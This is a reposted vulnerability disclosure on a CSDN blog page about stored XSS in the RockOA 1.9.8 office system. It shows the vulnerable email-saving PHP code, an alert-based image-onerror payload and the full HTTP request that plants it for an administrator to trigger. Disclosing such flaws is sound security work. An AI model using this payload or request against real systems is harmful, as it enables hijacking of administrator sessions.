=== Content from blog.csdn.net_a344d548_20250119_114434.html ===


# There is one Storage type XSS vulnerability that can js code execution in rockoa 1.9.8

最新推荐文章于 2023-03-21 09:17:04 发布
![](https://csdnimg.cn/release/blogv2/dist/pc/img/reprint.png)
[adminxw](https://blog.csdn.net/adminxw "adminxw")
![](https://csdnimg.cn/release/blogv2/dist/pc/img/newCurrentTime2.png)
最新推荐文章于 2023-03-21 09:17:04 发布
![](https://csdnimg.cn/release/blogv2/dist/pc/img/articleReadEyes2.png)
阅读量3.7k
![](https://csdnimg.cn/release/blogv2/dist/pc/img/tobarCollect2.png)
![](https://csdnimg.cn/release/blogv2/dist/pc/img/tobarCollectionActive2.png)
收藏
![](https://csdnimg.cn/release/blogv2/dist/pc/img/newHeart2023Active.png)
![](https://csdnimg.cn/release/blogv2/dist/pc/img/newHeart2023Black.png)
点赞数

文章标签：
[vul](https://so.csdn.net/so/search/s.do?q=vul&t=all&o=vip&s=&l=&f=&viparticle=&from_tracking_code=tag_word&from_code=app_blog_art)

原文链接：<https://github.com/alixiaowei/alixiaowei.github.io/issues/2>

版权

Official website: http://www.rockoa.com/
 demo link: http://demo.rockoa.com/
 Vulnerability path: webmain/flow/input/mode\_emailmAction.php

line: 34-63

```
protected function saveafter($table, $arr, $id, $addbo)
	{
		$isturn = (int)$arr['isturn'];
		$type 	= (int)$arr['type'];
		if($isturn==1){
			if($type==0){
				$this->flow->savesubmid($arr['receid'], $id, 0,0);
				$this->flow->savesubmid($arr['ccid'], $id, 1,0);
			}
			$this->flow->savesubmid($arr['sendid'], $id, 2,1);
			//外发发邮件的
			if($type == 1){
				$emsa = $this->getrecename($arr['receid']);
				if($emsa != ''){
					$ccsa 	= $this->getrecename($arr['ccid']);
					$fjar 	= m('file')->getfilepath('emailm', $id);
					m('email')->sendemailout($this->adminid, array(
						'title' 	=> $arr['title'],
						'body' 		=> $arr['content'],
						'receemail' => $emsa[0],
						'recename' 	=> $emsa[1],
						'ccemail' 	=> $ccsa[0],
						'ccname' 	=> $ccsa[1],
						'attachpath'=> $fjar[0],
						'attachname'=> $fjar[1],
					), 1);//自己发送，不异步
				}
			}
		}
	}

```

Send email no filtering of dangerous characters leads to XSS, which can be used to obtain administrator cookies.

Verification:

user: wangjing
 wangjing(user) send email administrator
 title:

```
<img src=x onerror=alert(/xss_test/)>

```

![1571048502564](https://i-blog.csdnimg.cn/blog_migrate/b6a81b555723f213e79fd67f005d0af7.png)

```
POST /xinhu/index.php?a=save&m=mode_emailm|input&d=flow&ajaxbool=true&rnd=897989 HTTP/1.1
Host: 192.168.174.136:829
Content-Length: 193
Accept: */*
Origin: http://192.168.174.136:829
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.174.136:829/xinhu/?a=lu&m=input&d=flow&num=emailm&mid=0&callback=
Accept-Encoding: gzip, deflate
Accept-Language: zh-HK,zh-CN;q=0.9,zh;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: PHPSESSID=gjqr8gpe7g4dlrqjjjmfvl2ja4; deviceid=1571022073329; xinhu_ca_rempass=0; xinhu_mo_adminid=ru0tvv0mn0yn0ur0mt0rv0tvt0mm0tvv0mm0yr08; xinhu_ca_adminuser=wangj
Connection: close

id=0&title=%3Cimg+src%3Dx+onerror%3Dalert(%2Fxss_test%2F)%3E&type=0&isturn=1&recename=%E7%AE%A1%E7%90%86%E5%91%98&receid=u1&ccname=&ccid=&content=xss_test&fileid=&sysmodeid=47&sysmodenum=emailm

```

After the administrator logged Trigger XSS
 ![1571048695750](https://i-blog.csdnimg.cn/blog_migrate/bdb57bee986125109e05028476cdb469.png)

![](https://csdnimg.cn/release/blogv2/dist/pc/img/vip-limited-close-newWhite.png)
确定要放弃本次机会？

福利倒计时

*:*

*:*

![](https://csdnimg.cn/release/blogv2/dist/pc/img/vip-limited-close-roup.png)
立减 ¥

普通VIP年卡可用

[立即使用](https://mall.csdn.net/vip)

[![](https://profile-avatar.csdnimg.cn/default.jpg!1)
adminxw](https://blog.csdn.net/adminxw)

关注
关注

* ![](https://csdnimg.cn/release/blogv2/dist/pc/img/tobarThumbUpactive.png)
  ![](https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/like-active.png)
  ![](https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/like.png)
  0
  点赞
* ![](https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/unlike-active.png)
  ![](https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/unlike.png)
  踩
* ![](https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/collect-active.png)
  ![](https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/collect.png)
  ![](https://csdnimg.cn/release/blogv2/dist/pc/img/newCollectActive.png)
  0
  收藏

  觉得还不错?
  一键收藏

  ![](https://csdnimg.cn/release/blogv2/dist/pc/img/collectionCloseWhite.png)
* ![](https://csdnimg.cn/release/blogv2/dist/pc/img/guideRedReward01.png)
  知道了

  [![](https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/comment.png)
  0](#commentBox)
  评论
* ![](https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/share.png)
  分享
  复制链接

  分享到 QQ

  分享到新浪微博

  ![](https://csdnimg.cn/release/blogv2/dist/pc/img/share/icon-wechat.png)扫一扫
* ![](https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/more.png)
  ![](https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/report.png)
  举报

  ![](https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/report.png)
  举报

[Apache RocketMQ RCE*漏洞*复现(CVE-2023-33246)](https://axsec.blog.csdn.net/article/details/130987233)

[0xSec](https://blog.csdn.net/qq_41904294)

06-01
![](https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png)
1万+

[RocketMQ 5.1.0及以下版本，在一定条件下，存在远程命令执行风险。RocketMQ的NameServer、Broker、Controller等多个组件暴露在外网且缺乏权限验证，攻击者可以利用该*漏洞*利用更新配置功能以RocketMQ运行的系统用户身份执行命令。此外，攻击者可以通过伪造 RocketMQ 协议内容来达到同样的效果。](https://axsec.blog.csdn.net/article/details/130987233)

[*rockoa*](https://blog.csdn.net/weixin_33863087/article/details/92460806)

[weixin\_33863087的博客](https://blog.csdn.net/weixin_33863087)

09-24
![](https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png)
569

[*ROCKOA*办公系统是适用于中小型企业的通用型协同OA管理软件，融合了长期从事管理软件开发的丰富经验与先进技术，该系统采用领先的B/S(浏览器/服务器)操作方式，使得网络办公不受地域限制。实验环境centos6.5\_x64实验软件*rockoa*\_utf8\_2.3.2.rar软件安装yum *in*stall -y mysql mysql-server httpd php-soa...](https://blog.csdn.net/weixin_33863087/article/details/92460806)

参与评论
您还未登录，请先
登录
后发表或查看评论

[DC系列*漏洞*靶场-渗透测试学习复现（DC-6）](https://blog.csdn.net/W983079520/article/details/110798735)

[W983079520的博客](https://blog.csdn.net/W983079520)

12-07
![](https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png)
2654

[DC-6是一个易受攻击的实验环境，最终目的是让攻击者获得root权限，并读取flag。
DC-6使用的操作系统为Debian 64位。
靶场下载链接：
1 http://www.five86.com/downloads/DC-6.zip
2 https://download.*vul*nhub.com/dc/DC-6.zip
3 https://download.*vul*nhub.com/dc/DC-6.zip.torrent
1 环境搭建
下载靶场文件，使用Vbox或者VM打开即可;攻击机使.](https://blog.csdn.net/W983079520/article/details/110798735)

[WuThreat身份安全云-TVD每日*漏洞*情报-2023-03-21](https://blog.csdn.net/weixin_44242297/article/details/129681248)

[wuthreat无胁科技的博客](https://blog.csdn.net/weixin_44242297)

03-21
![](https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png)
522

[参考链接:https://tvd.wuthreat.com/#/l*is*tDetail?参考链接:https://tvd.wuthreat.com/#/l*is*tDetail?参考链接:https://tvd.wuthreat.com/#/l*is*tDetail?参考链接:https://tvd.wuthreat.com/#/l*is*tDetail?参考链接:https://tvd.wuthreat.com/#/l*is*tDetail?*漏洞*编号:CVE-2023-27586。*漏洞*编号:CVE-2023-28424。](https://blog.csdn.net/weixin_44242297/article/details/129681248)

[*ROCKOA*协同办公系统 2.3.2](https://download.csdn.net/download/weixin_38700320/18286164)

05-01

[*ROCKOA*协同办公系统是适用于中小型企业的通用型协同OA管理软件，融合了长期从事管理软件开发的丰富经验与先进技术，该系统采用领先的B/S(浏览器/服务器)操作方式，使得网络办公不受地域限制。
*ROCKOA*协同办公系统 2.3.2 更新日志：2016-07-05
1、添加自定义元素。2、自定义表单开发流程。](https://download.csdn.net/download/weixin_38700320/18286164)

[*xss*.*js*.zip](https://download.csdn.net/download/johnyeah12/12669217)

07-29

["*xss*.*js*.zip"是一个专注于防止*XSS*攻击的JavaScript模块，它通过严格的输入过滤和白名单策略来确保用户提交的内容不会引入潜在的恶意代码。 首先，"*xss*.*js*"的核心功能在于提供了一套完整的输入过滤机制。这个模块会...](https://download.csdn.net/download/johnyeah12/12669217)

[javascript过滤*XSS*](https://download.csdn.net/download/lliiqiang/7303251)

05-06

[JavaScript过滤*XSS*（Cross Site Script*in*g）是一种防御性编程技术，用于防止恶意用户通过注入脚本到网页中，对其他用户进行攻击。*XSS*攻击通常发生在动态生成HTML内容的场景，比如用户评论、论坛帖子等。攻击者可以...](https://download.csdn.net/download/lliiqiang/7303251)

[第八节 Javascript伪协议的*XSS*-01](https://download.csdn.net/download/xiaoli8748/88341809)

09-15

["第八节 Javascript伪协议的*XSS*-01" Javascript伪协议是一种特殊的协议类型，它可以将javascript代码添加到客户端，javascript伪协议的URL中包含javascript代码，浏览器会将其解释为javascript语句，并执行之。...](https://download.csdn.net/download/xiaoli8748/88341809)

[*xss*测试代码大全javascript中的*xss*过滤](https://download.csdn.net/download/qq_41770175/85028831)

03-24

[*xss*测试代码大全](https://download.csdn.net/download/qq_41770175/85028831)

[防止*xss*和sql注入:*JS*特殊字符过滤正则](https://download.csdn.net/download/weixin_38735782/13209359)

12-01

[在提供的代码中，`stripscript`函数就是一个用于过滤*JS*特殊字符的示例，旨在减少*XSS*攻击的可能性。该函数通过正则表达式匹配并移除字符串中可能引起*XSS*攻击的字符。 正则表达式`/%–`~!@#$^&\*()=|{}’:;’,\\[\\]....](https://download.csdn.net/download/weixin_38735782/13209359)

[*ROCKOA*协同办公OA v2.3.2.zip](https://download.csdn.net/download/weixin_39840924/11291065)

07-07

[*ROCKOA*协同办公OA  更新日志：
1、添加自定义元素。
2、自定义表单开发流程。
*ROCKOA*协同办公OA简介
*ROCKOA*办公系统是适用于中小型企业的通用型协同OA管理软件，融合了长期从事管理软件开发的丰富经验与先进技术，该系统采用领先的B/S(浏览器/服务器)操作方式，使得网络办公不受地域限制。
*ROCKOA*使用敏捷Ext前端开发框架，支持多种模块分布式开发，统一布局，界面简洁不失严肃。其功能包含有个人办公、工作流、人力资源、行政办公、员 工档案、用户管理等，含盖60多个功能点，适合于企业领域内若干规范和要求，构成高性能、高可用、高质量、底成本的信息化管理平台。
 *ROCKOA*协同办公OA页面展示
相关阅读
同类推荐：oa系统](https://download.csdn.net/download/weixin_39840924/11291065)

[*RockOA*协同办公OA系统 v2.3.2](https://download.csdn.net/download/weixin_38528517/13456949)

12-06

[*RockOA*是一款开源OA办公系统，让每个企业都有属于自己的OA办公系统。 *RockOA*办公系统是适用于中小型企业的通用型协同OA管理软件，融合了长期从事管理软件开发的丰富经验与先进技术，该系统采用领先的B/S(浏览器/服务器)操作方式，使得网络办公不受地域限制。](https://download.csdn.net/download/weixin_38528517/13456949)

[蓝凌(Landray)OA*漏洞*常见RCE
热门推荐](https://blog.csdn.net/qq_53385700/article/details/128650811)

[qq\_53385700的博客](https://blog.csdn.net/qq_53385700)

01-12
![](https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png)
1万+

[蓝凌OA常见RCE的poc](https://blog.csdn.net/qq_53385700/article/details/128650811)

[记一次完整的渗透测试](https://blog.csdn.net/LiuWang0314/article/details/106214283)

[LiuWang0314的博客](https://blog.csdn.net/LiuWang0314)

05-21
![](https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png)
2387

[目录前言掉坑起因（通达OA前台任意用户登录）掉坑过程一（上传webshell问题）掉坑过程二（cmdshell提权问题）如何改变文本的样式插入链接与图片如何插入一段漂亮的代码片生成一个适合你的列表创建一个表格设定内容居中、居左、居右SmartyPants创建一个自定义列表如何创建一个注脚注释也是必不可少的KaTeX数学公式新的甘特图功能，丰富你的文章UML 图表FLowchart流程图导出与导入导出导入
前言
本次渗透测试过程大概是这样的：通达OA前台任意用户登录-上传webshell-获取相关信息-提权c](https://blog.csdn.net/LiuWang0314/article/details/106214283)

[OA系统*漏洞*记录](https://blog.csdn.net/Aquarius_ego/article/details/124774268)

[Aquarius\_ego的博客](https://blog.csdn.net/Aquarius_ego)

05-14
![](https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png)
4999

[OA系统介绍及相关*漏洞*（不断更新哦~）](https://blog.csdn.net/Aquarius_ego/article/details/124774268)

[OA-命令执行*漏洞*复现](https://moments.blog.csdn.net/article/details/105047020)

[千寻的博客](https://blog.csdn.net/qq_41901122)

03-23
![](https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png)
2971

[文章目录0x01介绍0x02原理0x03影响版本0x04环境搭建0x05*漏洞*复现方法一:通过抓包，改包进行利用方法二：直接利用免责声明本文档供学习，请使用者注意使用环境并遵守国家相关法律法规!由于使用不当造成的后果上传者概不负责！
0x01介绍
OA（Office Anywhere网络智能办公系统）办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。
OA为各行业不同规模的众多用户提...](https://moments.blog.csdn.net/article/details/105047020)

[*rockoa*开发笔记](https://blog.csdn.net/weixin_30325487/article/details/97120881)

[weixin\_30325487的博客](https://blog.csdn.net/weixin_30325487)

01-05
![](https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png)
472

[*rockoa*开发笔记
1.开启PHP短标签，2.数据库密码配置在webrock/webrockConfig.php
posted on 2016-01-05 23:54 过去的泉 阅读(...) 评论(...) 编辑 收藏
var allowComments=t...](https://blog.csdn.net/weixin_30325487/article/details/97120881)

[教务管理系统，个人学习整理，仅供参考
最新发布](https://download.csdn.net/download/zru_9602/90284414)

01-18

[===下载后有不懂的可以私信我。====
这是一个教务管理系统的源码，使用的开发语言是Java，数据库是MySql，使用的框架是Struts+Hibernate，这是我刚刚学习的代码，和大家一切分享，将代码直接导入MyEclipse 中就可以运行了，有什么问题及时跟我沟通，我们一起沟通学习。。内容来源于网络分享，如有侵权请联系我删除。](https://download.csdn.net/download/zru_9602/90284414)

[![](https://profile-avatar.csdnimg.cn/default.jpg!1)](https://blog.csdn.net/adminxw)

[adminxw](https://blog.csdn.net/adminxw "adminxw")

CSDN认证博客专家

CSDN认证企业博客

码龄9年
[![](https://csdnimg.cn/identity/nocErtification.png)
暂无认证](https://i.csdn.net/#/uc/profile?utm_source=14998968 "暂无认证")

[0
原创](https://blog.csdn.net/adminxw)

[69万+
周排名](https://blog.csdn.net/rank/list/weekly)

[85万+
总排名](https://blog.csdn.net/rank/list/total)

3742
访问

[![](https://csdnimg.cn/identity/blog1.png)](https://blog.csdn.net/blogdevteam/article/details/103478461)

等级

2
积分

0
粉丝

0
获赞

0
评论

0
收藏

![创作能手](https://csdnimg.cn/medal/qixiebiaobing4@240.png)

[私信](https://im.csdn.net/chat/adminxw)

关注

![]()
[![写文章](https://img-home.csdnimg.cn/images/20250107060517.png)](https://www.csdn.net/blogstar2024?utm_source=1333680121)

![](//csdnimg.cn/cdn/content-toolbar/csdn-sou.png?v=1587021042)

![]()

### 热门文章

* [There is one Storage type XSS vulnerability that can js code execution in rockoa 1.9.8
  ![](https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png)
  3741](https://blog.csdn.net/adminxw/article/details/102881463)

### 大家在看

* [计算机毕业设计Springboot基于vue的电商系统 基于SpringBoot和Vue的在线购物平台 Vue.js与SpringBoot结合的电子商务系统
  ![](https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png)
  450](https://blog.csdn.net/wuzhou204/article/details/145241642)
* [Java八股-JDK和JRE的区别？
  ![](https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png)
  193](https://blog.csdn.net/weixin_69353983/article/details/145157843)
* [SerializeJava-反序列化图形化工具
  ![](https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png)
  665](https://blog.csdn.net/LYZ_2108921628/article/details/145229278)
* [链接预览只是Peek Pop插件的功能之一！
  ![](https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png)
  64](https://blog.csdn.net/weixin_43791391/article/details/145234863)
* [关于技嘉平台主机电脑有啸叫声的解决方法](https://blog.csdn.net/weixin_51789501/article/details/145243727)

### 最新文章

[2019年1篇](https://blog.csdn.net/adminxw?type=blog&year=2019&month=11)

![]()

### 目录

![]()

### 目录

![]()

### 最新文章

[2019年1篇](https://blog.csdn.net/adminxw?type=blog&year=2019&month=11)

### 目录

评论
![](https://csdnimg.cn/release/blogv2/dist/pc/img/closeBt.png)

![](https://csdnimg.cn/release/blogv2/dist/pc/img/commentArrowLeftWhite.png)被折叠的  条评论
[为什么被折叠?](https://blogdev.blog.csdn.net/article/details/122245662)
[![](https://csdnimg.cn/release/blogv2/dist/pc/img/iconPark.png)到【灌水乐园】发言](https://bbs.csdn.net/forums/FreeZone)

查看更多评论![](https://csdnimg.cn/release/blogv2/dist/pc/img/commentArrowDownWhite.png)

添加红包

祝福语

请填写红包祝福语或标题

红包数量

个

红包个数最小为10个

红包总金额

元

红包金额最低5元

余额支付
当前余额3.43元
[前往充值 >](https://i.csdn.net/#/wallet/balance/recharge)

需支付：10.00元

取消
确定

![](https://csdnimg.cn/release/blogv2/dist/pc/img/guideRedReward02.png)
下一步

![](https://csdnimg.cn/release/blogv2/dist/pc/img/guideRedReward03.png)
知道了

![]()

领取后你会自动成为博主和红包主的粉丝
规则

![](https://profile-avatar.csdnimg.cn/default.jpg!2)
hope\_wisdom 发出的红包

实付元
使用余额支付
![](https://csdnimg.cn/release/blogv2/dist/pc/img/pay-time-out.png)
点击重新获取

![](https://csdnimg.cn/release/blogv2/dist/pc/img/weixin.png)![](https://csdnimg.cn/release/blogv2/dist/pc/img/zhifubao.png)![](https://csdnimg.cn/release/blogv2/dist/pc/img/jingdong.png)扫码支付

钱包余额
0
![](https://csdnimg.cn/release/blogv2/dist/pc/img/pay-help.png)

抵扣说明：

1.余额是钱包充值的虚拟货币，按照1:1的比例进行支付金额的抵扣。
 2.余额无法直接购买下载，可以购买VIP、付费专栏及课程。

[![](https://csdnimg.cn/release/blogv2/dist/pc/img/recharge.png)余额充值](https://i.csdn.net/#/wallet/balance/recharge)

![]()


